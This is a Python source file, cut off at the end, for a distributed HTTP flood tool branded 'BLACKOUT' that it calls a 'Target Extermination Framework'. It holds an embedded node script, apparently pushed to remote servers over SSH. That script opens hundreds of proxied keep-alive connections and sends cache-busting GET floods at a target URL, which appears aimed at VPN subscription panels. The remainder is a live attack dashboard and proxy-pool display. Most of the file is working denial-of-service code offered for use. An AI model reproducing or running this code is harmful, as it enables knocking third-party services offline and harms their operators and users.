#!/usr/bin/env python3
import asyncio
import shutil
import aiohttp
import random
import string
import time
import os
import sys
import json
import base64
import signal
import ssl as ssl_lib
from datetime import datetime
import getpass

try:
    sys.stdin.reconfigure(encoding='utf-8', errors='replace')
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

try:
    from aiohttp_socks import ProxyConnector
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

PROXY_SSL_CTX = ssl_lib.create_default_context()
PROXY_SSL_CTX.check_hostname = False
PROXY_SSL_CTX.verify_mode = ssl_lib.CERT_NONE

NODES_FILE = "nodes.json"
DEFAULT_RPS = 800
DEFAULT_WORKERS = 800

_INTERRUPTED = [False]


def _restore_terminal():
    try:
        sys.stdout.write("\033[?25h")
        sys.stdout.flush()
    except Exception:
        pass


def _sigint_handler(signum, frame):
    _INTERRUPTED[0] = True
    _restore_terminal()
    try:
        asyncio.get_running_loop()
        return
    except RuntimeError:
        raise KeyboardInterrupt()


try:
    signal.signal(signal.SIGINT, _sigint_handler)
except Exception:
    pass


async def interruptible_sleep(seconds):
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        if _INTERRUPTED[0]:
            return
        remaining = end - time.monotonic()
        await asyncio.sleep(min(0.5, max(0.05, remaining)))


NODE_SCRIPT = r'''#!/usr/bin/env python3
import asyncio, ssl, random, string, sys, json, time, os, signal, base64
import socket as _socket, ipaddress as _ipaddress, concurrent.futures, threading
from urllib.parse import urlparse

STATUS_FILE = "/tmp/node_attack_status.json"
PID_FILE = "/tmp/node_attack.pid"
LOG_FILE = "/tmp/node_attack.log"

def log(msg):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
    except Exception:
        pass

def parse_args():
    args = {"target": None, "workers": 800, "duration": 600,
            "proxies": "", "rps": 800}
    i = 1
    while i < len(sys.argv):
        a = sys.argv[i]
        if a == "--target" and i + 1 < len(sys.argv):
            args["target"] = sys.argv[i + 1]; i += 2
        elif a == "--workers" and i + 1 < len(sys.argv):
            try: args["workers"] = int(sys.argv[i + 1])
            except: pass
            i += 2
        elif a == "--duration" and i + 1 < len(sys.argv):
            try: args["duration"] = int(sys.argv[i + 1])
            except: pass
            i += 2
        elif a == "--rps" and i + 1 < len(sys.argv):
            try: args["rps"] = int(sys.argv[i + 1])
            except: pass
            i += 2
        elif a == "--proxies" and i + 1 < len(sys.argv):
            args["proxies"] = sys.argv[i + 1]; i += 2
        else:
            i += 1
    return args

ARGS = parse_args()
TARGET = ARGS["target"]
WORKERS = ARGS["workers"]
DURATION = ARGS["duration"]
RPS = ARGS["rps"]

PROXIES = []
if ARGS["proxies"]:
    try:
        raw = base64.b64decode(ARGS["proxies"]).decode(errors="ignore")
        for line in raw.split(","):
            line = line.strip()
            if line:
                PROXIES.append(line)
    except Exception:
        pass

parsed = urlparse(TARGET)
HOST = parsed.hostname
PORT = parsed.port or (443 if parsed.scheme == "https" else 80)
USE_SSL = parsed.scheme == "https"
HOST_HEADER = parsed.netloc
BASE_PATH = parsed.path or "/"
QUERY = parsed.query

STATS = {"requests": 0, "success": 0, "timeouts": 0, "errors": 0, "blocked": 0, "srv_err": 0}
STATS_LOCK = threading.Lock()
RUNNING = [True]
ERROR_COUNT = [0]
CONNECTED_COUNT = [0]

UAS = [
    "v2rayN/6.23", "Clashmeta/1.16.0", "Mozilla/5.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Shadowrocket/1982 CFNetwork/1410.0.3 Darwin/22.6.0",
]

def rand_str(n=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def write_status(state):
    try:
        data = {
            "requests": int(STATS["requests"]),
            "success": int(STATS["success"]),
            "timeouts": int(STATS["timeouts"]),
            "errors": int(STATS["errors"]),
            "blocked": int(STATS["blocked"]),
            "srv_err": int(STATS["srv_err"]),
            "connected": int(CONNECTED_COUNT[0]),
            "errors_total": int(ERROR_COUNT[0]),
            "state": str(state),
            "ts": float(time.time()),
            "pid": int(os.getpid()),
        }
        tmp = STATUS_FILE + ".tmp"
        with open(tmp, "w") as f:
            json.dump(data, f)
        os.replace(tmp, STATUS_FILE)
    except Exception as e:
        log(f"write_status fail: {e}")

def handle_signal(signum, frame):
    RUNNING[0] = False
    write_status("stopped")
    try:
        os._exit(0)
    except Exception:
        pass

signal.signal(signal.SIGTERM, handle_signal)
signal.signal(signal.SIGINT, handle_signal)


def parse_proxy_url(p):
    try:
        if "://" not in p:
            p = "http://" + p
        u = urlparse(p)
        scheme = (u.scheme or "http").lower()
        if scheme not in ("socks5", "http", "https"):
            return None
        host = u.hostname
        port = u.port
        if not host or not port:
            return None
        return (scheme, host, port, u.username, u.password)
    except Exception:
        return None

def pick_proxy():
    if not PROXIES:
        return None
    for _ in range(5):
        pr = parse_proxy_url(random.choice(PROXIES))
        if pr:
            return pr
    return None


def _sync_connect(proxy, host, port, use_ssl, timeout):
    if proxy is None:
        s = _socket.create_connection((host, port), timeout=timeout)
        s.setblocking(False)
        return s

    scheme, phost, pport, puser, ppwd = proxy
    s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
    try:
        s.settimeout(timeout)
        s.connect((phost, pport))

        if scheme == "socks5":
            if puser:
                s.sendall(b"\x05\x02\x00\x02")
            else:
                s.sendall(b"\x05\x01\x00")
            hdr = s.recv(2)
            if len(hdr) != 2 or hdr[0] != 0x05:
                raise Exception("socks5: bad greeting")
            method = hdr[1]
            if method == 0x02:
                u = (puser or "").encode()
                pw = (ppwd or "").encode()
                s.sendall(bytes([0x01, len(u)]) + u + bytes([len(pw)]) + pw)
                auth = s.recv(2)
                if len(auth) != 2 or auth[1] != 0x00:
                    raise Exception("socks5: auth failed")
            elif method != 0x00:
                raise Exception("socks5: no acceptable auth")

            try:
                _ipaddress.ip_address(host)
                atyp = 0x01
                addr = _ipaddress.ip_address(host).packed
            except ValueError:
                atyp = 0x03
                hb = host.encode()
                addr = bytes([len(hb)]) + hb

            req = bytes([0x05, 0x01, 0x00, atyp]) + addr + port.to_bytes(2, "big")
            s.sendall(req)
            resp = s.recv(4)
            if len(resp) < 4 or resp[1] != 0x00:
                code = resp[1] if len(resp) > 1 else -1
                raise Exception(f"socks5: connect failed code={code}")
            if resp[3] == 0x01:
                s.recv(6)
            elif resp[3] == 0x03:
                ln = s.recv(1)
                if ln:
                    s.recv(ln[0] + 2)
            elif resp[3] == 0x04:
                s.recv(18)

        elif scheme in ("http", "https"):
            req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            if puser:
                token = base64.b64encode(f"{puser}:{ppwd or ''}".encode()).decode()
                req += f"Proxy-Authorization: Basic {token}\r\n"
            req += "Proxy-Connection: keep-alive\r\n\r\n"
            s.sendall(req.encode())

            buf = b""
            while b"\r\n\r\n" not in buf:
                chunk = s.recv(1024)
                if not chunk:
                    raise Exception("http-proxy: closed")
                buf += chunk
                if len(buf) > 8192:
                    break
            if not (buf.startswith(b"HTTP/1.1 200") or buf.startswith(b"HTTP/1.0 200")):
                line = buf.split(b"\r\n", 1)[0].decode(errors="ignore")
                raise Exception(f"http-proxy: {line}")

        s.setblocking(False)
        return s
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        raise


class Session:
    def __init__(self):
        self.reader = None
        self.writer = None
        self.proxy = None

    async def connect(self):
        await self.close()
        self.proxy = pick_proxy() if PROXIES else None
        sock = await asyncio.to_thread(
            _sync_connect, self.proxy, HOST, PORT, USE_SSL, 10
        )
        if USE_SSL:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            self.reader, self.writer = await asyncio.open_connection(
                sock=sock, ssl=ctx, server_hostname=HOST
            )
        else:
            self.reader, self.writer = await asyncio.open_connection(sock=sock)

    async def close(self):
        if self.writer is not None:
            try:
                self.writer.close()
                await self.writer.wait_closed()
            except Exception:
                pass
        self.reader = None
        self.writer = None
        self.proxy = None

    async def send_request(self, path):
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {HOST_HEADER}\r\n"
            f"User-Agent: {random.choice(UAS)}\r\n"
            f"Accept: */*\r\n"
            f"Accept-Encoding: identity\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        self.writer.write(req.encode())
        await self.writer.drain()

        headers_data = await asyncio.wait_for(
            self.reader.readuntil(b"\r\n\r\n"), timeout=8
        )
        if not headers_data.startswith(b"HTTP/"):
            raise Exception("bad response")

        parts = headers_data.split(b" ", 2)
        code = int(parts[1])

        content_length = 0
        is_chunked = False
        for line in headers_data.split(b"\r\n")[1:]:
            lline = line.lower()
            if lline.startswith(b"content-length:"):
                try:
                    content_length = int(line.split(b":", 1)[1].strip())
                except Exception:
                    content_length = 0
            elif lline.startswith(b"transfer-encoding:") and b"chunked" in lline:
                is_chunked = True

        if is_chunked:
            while True:
                try:
                    chunk_line = await asyncio.wait_for(
                        self.reader.readuntil(b"\r\n"), timeout=5
                    )
                    chunk_size = int(chunk_line.strip().split(b";")[0], 16)
                    if chunk_size == 0:
                        try:
                            await asyncio.wait_for(
                                self.reader.readuntil(b"\r\n"), timeout=2
                            )
                        except Exception:
                            pass
                        break
                    await asyncio.wait_for(
                        self.reader.readexactly(chunk_size + 2), timeout=5
                    )
                except Exception:
                    break
        elif content_length > 0:
            to_read = min(content_length, 262144)
            try:
                await asyncio.wait_for(
                    self.reader.readexactly(to_read), timeout=8
                )
                extra = content_length - to_read
                while extra > 0:
                    chunk = await asyncio.wait_for(
                        self.reader.read(min(extra, 65536)), timeout=5
                    )
                    if not chunk:
                        break
                    extra -= len(chunk)
            except Exception:
                pass

        return code


CONNECT_SEM = None


async def worker(worker_id):
    delay = (1.0 / RPS) if RPS and RPS > 0 else 0.0
    session = Session()
    connected = False

    while RUNNING[0]:
        try:
            if not connected:
                if CONNECT_SEM is not None:
                    async with CONNECT_SEM:
                        try:
                            await session.connect()
                            connected = True
                            CONNECTED_COUNT[0] += 1
                        except Exception as e:
                            ERROR_COUNT[0] += 1
                            if ERROR_COUNT[0] % 500 == 0:
                                log(f"connect#{ERROR_COUNT[0]}: {type(e).__name__}: {str(e)[:60]}")
                else:
                    try:
                        await session.connect()
                        connected = True
                        CONNECTED_COUNT[0] += 1
                    except Exception:
                        ERROR_COUNT[0] += 1
                if not connected:
                    await asyncio.sleep(0.2)
                    continue

            if QUERY:
                path = f"{BASE_PATH}?{QUERY}&x={rand_str(8)}"
            else:
                path = f"{BASE_PATH}?x={rand_str(8)}"

            try:
                code = await session.send_request(path)
                STATS["requests"] += 1
                if code == 200:
                    STATS["success"] += 1
                elif code in (403, 429):
                    STATS["blocked"] += 1
                elif code >= 500:
                    STATS["srv_err"] += 1
                else:
                    STATS["success"] += 1
            except (asyncio.TimeoutError, ConnectionError, OSError,
                    asyncio.IncompleteReadError):
                STATS["requests"] += 1
                STATS["timeouts"] += 1
                connected = False
                try:
                    await session.close()
                except Exception:
                    pass
            except asyncio.CancelledError:
                break
            except Exception:
                STATS["requests"] += 1
                STATS["errors"] += 1
                connected = False
                try:
                    await session.close()
                except Exception:
                    pass

        except asyncio.CancelledError:
            break
        except Exception:
            ERROR_COUNT[0] += 1
            connected = False
            try:
                await session.close()
            except Exception:
                pass

        if delay > 0:
            await asyncio.sleep(delay)
        else:
            await asyncio.sleep(0)

    try:
        await session.close()
    except Exception:
        pass


async def main():
    global CONNECT_SEM

    try:
        thread_count = min(max(WORKERS, 64), 500)
        loop = asyncio.get_running_loop()
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=thread_count)
        loop.set_default_executor(executor)
    except Exception as e:
        log(f"executor setup fail: {e}")

    CONNECT_SEM = asyncio.Semaphore(min(max(WORKERS // 4, 64), 300))

    try:
        with open(PID_FILE, "w") as f:
            f.write(str(os.getpid()))
    except Exception:
        pass

    log(f"START target={TARGET} workers={WORKERS} duration={DURATION} "
        f"rps={RPS} proxies={len(PROXIES)} pid={os.getpid()}")
    write_status("starting")

    tasks = [asyncio.create_task(worker(i)) for i in range(WORKERS)]

    async def updater():
        while RUNNING[0]:
            await asyncio.sleep(1)
            write_status("attacking")

    updater_task = asyncio.create_task(updater())

    try:
        await asyncio.sleep(DURATION)
    except asyncio.CancelledError:
        pass
    finally:
        RUNNING[0] = False
        for t in tasks:
            t.cancel()
        updater_task.cancel()
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception:
            pass
        write_status("completed")
        log(f"DONE requests={STATS['requests']} success={STATS['success']} "
            f"timeouts={STATS['timeouts']} errors={STATS['errors']}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        write_status("stopped")
'''


class Colors:
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    MAGENTA = "\033[95m"
    BLUE = "\033[94m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"

USER_AGENTS = [
    "v2rayN/6.23", "Clashmeta/1.16.0", "v2box/1.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Shadowrocket/1982 CFNetwork/1410.0.3 Darwin/22.6.0",
    "sing-box/1.8.0"
]

ORIGIN_ERROR_CODES = {500, 501, 502, 503, 504, 507, 508, 510,
                      520, 521, 522, 523, 524, 525, 526, 527, 530}


def short_proxy(proxy):
    if not proxy:
        return "DIRECT"
    p = proxy
    if "://" in p:
        p = p.split("://", 1)[1]
    if "@" in p:
        p = p.split("@", 1)[1]
    return p


class RateLimiter:
    def __init__(self, rps):
        self.rps = rps
        if rps and rps > 0:
            self.delay = 1.0 / rps
        else:
            self.delay = 0.0

    async def wait(self):
        if self.delay > 0:
            await asyncio.sleep(self.delay)
        else:
            await asyncio.sleep(0)


class SafeModeState:
    def __init__(self):
        self.enabled = False
        self.active = False
        self.trigger_count = 0
        self.last_trigger_code = None
        self.last_trigger_time = None
        self.total_paused_seconds = 0.0
        self._pause_started_at = None
        self.monitor_probes = 0
        self.recovery_code = None

    def reset(self, enabled=False):
        self.enabled = enabled
        self.active = False
        self.trigger_count = 0
        self.last_trigger_code = None
        self.last_trigger_time = None
        self.total_paused_seconds = 0.0
        self._pause_started_at = None
        self.monitor_probes = 0
        self.recovery_code = None

    def trigger(self, code):
        if self.active:
            return False
        self.active = True
        self.trigger_count += 1
        self.last_trigger_code = code
        self.last_trigger_time = time.time()
        self._pause_started_at = time.time()
        return True

    def recover(self, code=200):
        if not self.active:
            return False
        if self._pause_started_at:
            self.total_paused_seconds += time.time() - self._pause_started_at
        self.active = False
        self.recovery_code = code
        self._pause_started_at = None
        return True


SAFE_MODE = SafeModeState()


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    clear_screen()
    banner = f"""
{Colors.RED}{Colors.BOLD}
  ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ ██████╗ ██╗   ██╗████████╗
  ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝
  ██████╔╝██║     ███████║██║     █████╔╝ ██║   ██║██║   ██║   ██║   
  ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║   ██║██║   ██║   ██║   
  ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗╚██████╔╝╚██████╔╝   ██║   
  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   
{Colors.RESET}{Colors.BOLD}{Colors.MAGENTA}                  [ PANEL/SUB URL ATTACK ]
{Colors.DIM}                  Advanced Target Extermination Framework{Colors.RESET}
"""
    print(banner)

def random_string(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


class LiveDashboard:
    _THROTTLE_SEC = 3
    _RENDER_INTERVAL = 0.5
    _RENDER_INTERVAL_HEAVY = 1.0
    _RENDER_INTERVAL_VERY_HEAVY = 2.0

    def __init__(self):
        self.enabled = False
        self._is_tty = False
        self.target = ""
        self.engine = ""
        self.safe_mode = False
        self.workers = 0
        self.workers_min = 50
        self.workers_max = 1000
        self.duration = 0.0
        self.start_time = 0.0
        self.master_stats = {}
        self.events = {}
        self.recent_logs = []
        self.nodes = []
        self.last_render = 0.0
        self._log_throttle = {}
        self._log_suppressed = {}
        self._last_total_shots = 0
        self.rps_limit = 0
        self._active = False
        self._last_rps = 0
        self._last_size = (0, 0)

    @staticmethod
    def _term_size():
        try:
            sz = shutil.get_terminal_size(fallback=(120, 35))
            return max(40, int(sz.columns)), max(12, int(sz.lines))
        except Exception:
            return 120, 35

    def start(self, target, engine, safe_mode, workers, workers_min,
              workers_max, duration, stats, rps_limit=0):
        try:
            self._is_tty = sys.stdout.isatty()
        except Exception:
            self._is_tty = False

        try:
            duration = float(duration)
        except Exception:
            duration = 600.0
        if duration <= 0 or duration > 86400 * 30:
            duration = 600.0

        self.enabled = True
        self.target = str(target or "")
        self.engine = str(engine or "")
        self.safe_mode = bool(safe_mode)
        self.workers = int(workers)
        self.workers_min = int(workers_min)
        self.workers_max = int(workers_max)
        self.duration = duration
        self.start_time = time.monotonic()
        self.master_stats = stats
        self.events = {}
        self.recent_logs = []
        self.last_render = 0.0
        self._log_throttle = {}
        self._log_suppressed = {}
        self._last_total_shots = 0
        self.rps_limit = int(rps_limit) if rps_limit else 0
        self._last_rps = 0
        self._last_size = (0, 0)

        if not self._is_tty:
            self.enabled = False
            self._active = False
            return

        try:
            sys.stdout.write("\033[?25l")
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.flush()
            self._active = True
        except Exception:
            self._active = False

    def stop(self):
        self.enabled = False
        if not self._active:
            return
        try:
            sys.stdout.write("\033[?25h")
            sys.stdout.write("\n")
            sys.stdout.flush()
        except Exception:
            pass
        self._active = False

    def add_event(self, label, n=1):
        self.events[label] = self.events.get(label, 0) + n

    def add_workers_spawned(self, n):
        self.add_event("Workers Spawned", n)

    def add_workers_cancelled(self, n):
        self.add_event("Workers Cancelled", n)

    def add_adapt(self, label):
        self.add_event(f"Adapt · {label}")

    def push_log(self, status_type, message):
        throttle_key = None
        if status_type in ("TIMEOUT", "FAIL", "403", "429"):
            throttle_key = status_type
        elif status_type.startswith("5"):
            throttle_key = "5xx"
        elif status_type == "OTHER":
            throttle_key = "OTHER"

        if throttle_key:
            now = time.time()
            last = self._log_throttle.get(throttle_key, 0)
            if now - last < self._THROTTLE_SEC:
                self._log_suppressed[throttle_key] = \
                    self._log_suppressed.get(throttle_key, 0) + 1
                return
            self._log_throttle[throttle_key] = now
            suppressed = self._log_suppressed.pop(throttle_key, 0)
            if suppressed > 0:
                message = f"{message}  {Colors.DIM}(+{suppressed} suppressed){Colors.RESET}"

        self.recent_logs.append((status_type, message, time.time()))
        if len(self.recent_logs) > 30:
            self.recent_logs.pop(0)

    def _event_color(self, name):
        if name.startswith("200"):
            return Colors.GREEN
        if ("Timeout" in name or "Server Error" in name or
                "Fail" in name or "403" in name):
            return Colors.RED
        if "429" in name:
            return Colors.YELLOW
        if "Spawned" in name:
            return Colors.CYAN
        if "Cancelled" in name:
            return Colors.YELLOW
        if "Adapt" in name:
            return Colors.CYAN
        if "Safe-Mode" in name:
            return Colors.MAGENTA
        if "All Proxies Dead" in name:
            return Colors.RED
        if "Proxy Revived" in name:
            return Colors.GREEN
        return Colors.RESET

    def _log_prefix(self, status_type):
        if status_type == "200":
            return f"{Colors.GREEN}● 200 OK{Colors.RESET}"
        if status_type == "429":
            return f"{Colors.YELLOW}● RATE-LIMIT{Colors.RESET}"
        if status_type == "403":
            return f"{Colors.RED}● BLOCKED/BAN{Colors.RESET}"
        if status_type.startswith("5"):
            return f"{Colors.RED}● SRV-ERR {status_type}{Colors.RESET}"
        if status_type == "TIMEOUT":
            return f"{Colors.RED}{Colors.BOLD}● DEADLOCK/TO{Colors.RESET}"
        if status_type == "FAIL":
            return f"{Colors.RED}● FAIL{Colors.RESET}"
        if status_type == "OTHER":
            return f"{Colors.RED}● OTHER{Colors.RESET}"
        if status_type == "PROXY":
            return f"{Colors.MAGENTA}● PROXY{Colors.RESET}"
        return f"{Colors.RED}● {status_type}{Colors.RESET}"

    @staticmethod
    def _fmt_time(seconds):
        try:
            seconds = float(seconds)
        except Exception:
            seconds = 0.0
        if seconds < 0 or seconds != seconds:
            seconds = 0.0
        seconds = min(seconds, 86400 * 30)
        total = int(seconds)
        if total >= 3600:
            h = total // 3600
            m = (total % 3600) // 60
            s = total % 60
            return f"{h:02d}:{m:02d}:{s:02d}"
        m = total // 60
        s = total % 60
        return f"{m:02d}:{s:02d}"

    def _sec_header(self, budget):
        if budget < 4:
            return []
        return [
            "",
            f"  {Colors.BOLD}{Colors.RED}● BLACKOUT · LIVE ATTACK DASHBOARD{Colors.RESET}",
            f"  {Colors.DIM}{'─' * 76}{Colors.RESET}",
            "",
        ]

    def _sec_attack(self, budget, elapsed, remaining):
        if budget < 5:
            ms = self.master_stats or {}
            return [
                f"  {Colors.BOLD}● ATTACK{Colors.RESET}  "
                f"Elapsed {self._fmt_time(elapsed)}  ·  "
                f"Shots {ms.get('requests', 0):,}  ·  "
                f"OK {ms.get('success', 0):,}  ·  "
                f"TO {ms.get('timeouts', 0):,}",
            ]
        lines = []
        ms = self.master_stats or {}
        total_shots = ms.get("requests", 0)
        rps = total_shots / elapsed if elapsed > 0 else 0

        target_disp = self.target
        if len(target_disp) > 58:
            target_disp = target_disp[:55] + "..."

        sm = (f"{Colors.GREEN}ON{Colors.RESET}" if self.safe_mode
              else f"{Colors.DIM}OFF{Colors.RESET}")

        if self.rps_limit and self.rps_limit > 0:
            rps_limit_str = f"  {Colors.DIM}· {self.rps_limit} rps/worker{Colors.RESET}"
        else:
            rps_limit_str = f"  {Colors.DIM}· unlimited{Colors.RESET}"

        lines.append(f"  {Colors.BOLD}● ATTACK STATUS{Colors.RESET}")
        lines.append(f"  {Colors.DIM}├─{Colors.RESET} Engine        {Colors.BOLD}{self.engine}{Colors.RESET}")
        lines.append(f"  {Colors.DIM}├─{Colors.RESET} Target        {Colors.DIM}{target_disp}{Colors.RESET}")
        lines.append(f"  {Colors.DIM}├─{Colors.RESET} Safe Mode     {sm}")
        lines.append(f"  {Colors.DIM}├─{Colors.RESET} Workers       "
                     f"{Colors.BOLD}{self.workers}{Colors.RESET}  "
                     f"{Colors.DIM}(min {self.workers_min} · max {self.workers_max}){Colors.RESET}")
        lines.append(f"  {Colors.DIM}├─{Colors.RESET} Elapsed       "
                     f"{Colors.BOLD}{self._fmt_time(elapsed)}{Colors.RESET}  "
                     f"{Colors.DIM}(remaining {self._fmt_time(remaining)}){Colors.RESET}")
        lines.append(f"  {Colors.DIM}├─{Colors.RESET} Total Shots   "
                     f"{Colors.BOLD}{total_shots:,}{Colors.RESET}  "
                     f"{Colors.DIM}·  {rps:,.1f} req/s{Colors.RESET}{rps_limit_str}")
        lines.append(
            f"  {Colors.DIM}└─{Colors.RESET} Master        "
            f"{Colors.GREEN}OK {ms.get('success', 0):,}{Colors.RESET}  "
            f"{Colors.RED}5xx {ms.get('server_error', 0):,}{Colors.RESET}  "
            f"{Colors.RED}TO {ms.get('timeouts', 0):,}{Colors.RESET}  "
            f"{Colors.RED}403 {ms.get('blocked', 0):,}{Colors.RESET}  "
            f"{Colors.YELLOW}429 {ms.get('rate_limit', 0):,}{Colors.RESET}"
        )
        lines.append("")
        self._last_rps = rps
        return lines

    def _sec_nodes(self, budget, elapsed):
        if budget < 2 or not self.nodes:
            return []
        lines = []
        attacking = sum(
            1 for n in self.nodes if getattr(n, "live_running", False)
        )
        lines.append(
            f"  {Colors.BOLD}{Colors.MAGENTA}● NODE CLUSTER{Colors.RESET}  "
            f"{Colors.DIM}({len(self.nodes)} nodes · {attacking} active){Colors.RESET}"
        )
        row_budget = budget - 2
        if row_budget < 1:
            return lines + [""]

        show_count = min(len(self.nodes), row_budget)
        needs_more = len(self.nodes) > show_count
        if needs_more and show_count > 0:
            show_count -= 1

        shown = self.nodes[:show_count]
        for i, n in enumerate(shown):
            is_last = (i == len(shown) - 1) and not needs_more
            prefix = "└─" if is_last else "├─"
            req = getattr(n, "live_requests", 0)
            ok = getattr(n, "live_success", 0)
            to = getattr(n, "live_timeouts", 0)
            se = getattr(n, "live_srv_err", 0)
            running = getattr(n, "live_running", False)

            if not running:
                st = f"{Colors.GREEN}DONE{Colors.RESET}"
            elif req == 0 and elapsed > 30:
                st = f"{Colors.RED}{Colors.BOLD}STALLED{Colors.RESET}"
            else:
                st = f"{Colors.MAGENTA}ATTACKING{Colors.RESET}"

            try:
                label = n.label()
            except Exception:
                label = f"{getattr(n, 'ip', '?')}:{getattr(n, 'port', 22)}"
            if len(label) > 22:
                label = label[:19] + "..."

            lines.append(
                f"  {Colors.DIM}{prefix}{Colors.RESET} "
                f"{label:<22}  "
                f"REQ {req:>8,}  "
                f"{Colors.GREEN}OK {ok:>7,}{Colors.RESET}  "
                f"{Colors.RED}TO {to:>7,}{Colors.RESET}  "
                f"{Colors.RED}5xx {se:>6,}{Colors.RESET}  [{st}]"
            )

        if needs_more:
            remaining = len(self.nodes) - show_count
            lines.append(
                f"  {Colors.DIM}└─{Colors.RESET} "
                f"{Colors.DIM}... and {remaining} more nodes{Colors.RESET}"
            )
        lines.append("")
        return lines

    def _sec_proxies(self, budget):
        try:
            proxy_sessions = list(PROXY_MANAGER.sessions.keys())
        except Exception:
            proxy_sessions = []
        if budget < 2 or not proxy_sessions:
            return []

        lines = []
        alive_cnt = 0
        for p in proxy_sessions:
            st = PROXY_MANAGER.proxy_stats.get(p, {})
            if not st.get("dead", False):
                alive_cnt += 1

        lines.append(
            f"  {Colors.BOLD}{Colors.MAGENTA}● PROXY POOL{Colors.RESET}  "
            f"{Colors.DIM}(mode: {PROXY_MANAGER.rotation_mode} · "
            f"{alive_cnt} alive / {len(proxy_sessions)} total){Colors.RESET}"
        )

        row_budget = min(4, budget - 2)
        if row_budget < 1:
            return lines + [""]

        sorted_proxies = sorted(
            proxy_sessions,
            key=lambda p: PROXY_MANAGER.proxy_stats.get(p, {}).get("requests", 0),
            reverse=True,
        )
        show_count = min(len(sorted_proxies), row_budget)
        needs_more = len(sorted_proxies) > show_count
        if needs_more and show_count > 0:
            show_count -= 1

        shown = sorted_proxies[:show_count]
        for i, p in enumerate(shown):
            is_last = (i == len(shown) - 1) and not needs_more
            prefix = "└─" if is_last else "├─"
            st = PROXY_MANAGER.proxy_stats.get(p, {})
            req = st.get("requests", 0)
            ok = st.get("success", 0)
            fl = st.get("fails", 0)
            lat = st.get("latency_ms", 0)
            dead = st.get("dead", False)
            status_str = (f"{Colors.RED}DEAD {Colors.RESET}"
                          if dead else f"{Colors.GREEN}ALIVE{Colors.RESET}")
            p_short = p
            if len(p_short) > 42:
                p_short = p_short[:39] + "..."
            lines.append(
                f"  {Colors.DIM}{prefix}{Colors.RESET} "
                f"{Colors.MAGENTA}{p_short:<42}{Colors.RESET}  "
                f"{status_str}  "
                f"REQ {req:>7,}  "
                f"{Colors.GREEN}OK {ok:>7,}{Colors.RESET}  "
                f"{Colors.RED}FAIL {fl:>5,}{Colors.RESET}  "
                f"{Colors.DIM}{lat:>4}ms{Colors.RESET}"
            )

        if needs_more:
            remaining = len(sorted_proxies) - show_count
            lines.append(
                f"  {Colors.DIM}└─{Colors.RESET} "
                f"{Colors.DIM}... and {remaining} more proxies{Colors.RESET}"
            )
        lines.append("")
        return lines

    def _sec_events(self, budget):
        if budget < 2 or not self.events:
            return []
        lines = [f"  {Colors.BOLD}● LIVE EVENTS{Colors.RESET}"]
        for name, count in sorted(self.events.items()):
            color = self._event_color(name)
            lines.append(
                f"  {Colors.DIM}├─{Colors.RESET} "
                f"{color}{name:<38}{Colors.RESET}  "
                f"{Colors.BOLD}{count:>10,}{Colors.RESET}"
            )
        lines.append("")
        return lines

    def _sec_activity(self, budget):
        if budget < 2 or not self.recent_logs:
            return []
        lines = [f"  {Colors.BOLD}● RECENT ACTIVITY{Colors.RESET}"]

        row_budget = min(5, budget - 2)
        if row_budget < 1:
            return lines + [""]

        logs = list(reversed(self.recent_logs))
        show_count = min(len(logs), row_budget)
        shown = logs[:show_count]
        for status_type, msg, ts in shown:
            ts_str = time.strftime("%H:%M:%S", time.localtime(ts))
            pfx = self._log_prefix(status_type)
            lines.append(f"  {Colors.DIM}{ts_str}{Colors.RESET}  {pfx}  {msg}")
        lines.append("")
        return lines

    def _sec_footer(self, budget):
        if budget < 1:
            return []
        return [
            f"  {Colors.DIM}[Ctrl+C to abort]  ·  rendered "
            f"{time.strftime('%H:%M:%S')}{Colors.RESET}",
        ]

    def _allocate_budgets(self, total_rows):
        HEADER_MIN = 4
        ATTACK_MIN = 5
        ATTACK_FULL = 9
        FOOTER_MIN = 1
        PROXIES_FIXED = 6
        ACTIVITY_FIXED = 7

        events_need = (len(self.events) + 2) if self.events else 0

        header = HEADER_MIN
        attack = ATTACK_FULL
        footer = FOOTER_MIN
        proxies = PROXIES_FIXED
        activity = ACTIVITY_FIXED
        events = events_need

        def total():
            return header + attack + footer + proxies + activity + events

        if total() > total_rows:
            excess = total() - total_rows
            take = min(excess, activity)
            activity -= take
        if total() > total_rows:
            excess = total() - total_rows
            take = min(excess, proxies)
            proxies -= take
        if total() > total_rows:
            attack = ATTACK_MIN
        if total() > total_rows:
            header = 0
        if total() > total_rows:
            excess = total() - total_rows
            take = min(excess, attack)
            attack -= take
        if total() > total_rows:
            attack = 0
            header = 0

        budgets = {
            "header": header,
            "attack": attack,
